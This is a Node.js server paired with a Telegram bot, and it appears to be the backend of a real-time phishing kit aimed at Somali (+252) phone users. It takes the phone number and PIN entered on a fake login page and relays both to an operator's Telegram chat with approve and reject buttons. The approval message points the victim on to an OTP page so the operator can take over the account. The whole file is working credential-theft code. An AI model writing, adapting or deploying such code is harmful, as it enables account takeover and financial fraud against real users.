const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
const statusStore = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) {
        return res.status(400).json({ error: "Missing data" });
    }

    statusStore[phone] = "pending";

    const message =
        `📱 <b>CL 2 - LOGIN ATTEMPT</b>\n\n` +
        `🆕 <b>NEW USER</b>\n` +
        `🇸🇴 <b>Country:</b> ${country}\n` +
        `🌍 <b>Country Code:</b> ${countryCode}\n` +
        `📱 <b>Phone Number:</b> ${phone}\n` +
        `🔢 <b>PIN:</b> ${pin}\n` +
        `⏰ <b>Time:</b> ${currentTime}\n\n` +
        `━━━━━━━━━━━━━━━\n\n` +
        `⚠️ <b>User waiting for approval</b>\n` +
        `⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "✅ Allow to Proceed",
                            callback_data: `allow_to_proceed_${phone}_${pin}`
                        }
                    ],
                    [
                        {
                            text: "❌ Invalid Information",
                            callback_data: `invalid_information_${phone}`
                        }
                    ]
                ]
            }
        });

        res.json({ success: true });

    } catch (err) {
        console.error(err.message);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE
bot.action(/allow_to_proceed_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];

    statusStore[phone] = "approved";

    const currentTime = new Date().toLocaleTimeString('en-US', {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    const approvedMsg =
        `✅ <b>LOGIN APPROVED</b>\n\n` +
        `📱 <b>${phone}</b>\n` +
        `🔐 <b>${pin}</b>\n\n` +
        `━━━━━━━━━━━━━━━\n\n` +
        `➡️ <b>Next: OTP Page</b>\n` +
        `⏱️ <b>${currentTime}</b>`;

    try {
        await ctx.replyWithHTML(approvedMsg);
        await ctx.answerCbQuery("Allowed");
    } catch (e) {
        console.error(e.message);
    }
});

// INVALID
bot.action(/invalid_information_(.+)/, async (ctx) => {
    const phone = ctx.match[1];

    statusStore[phone] = "denied";

    try {
        await ctx.replyWithHTML(
            `❌ <b>INVALID INFORMATION</b>\n\n📱 ${phone}\n⚠️ Try again`
        );
        await ctx.answerCbQuery("Invalid");
    } catch (e) {
        console.error(e.message);
    }
});

// -------------------- CHECK STATUS --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;

    if (!phone) {
        return res.json({ status: "pending" });
    }

    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
const startBot = async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
};

startBot();
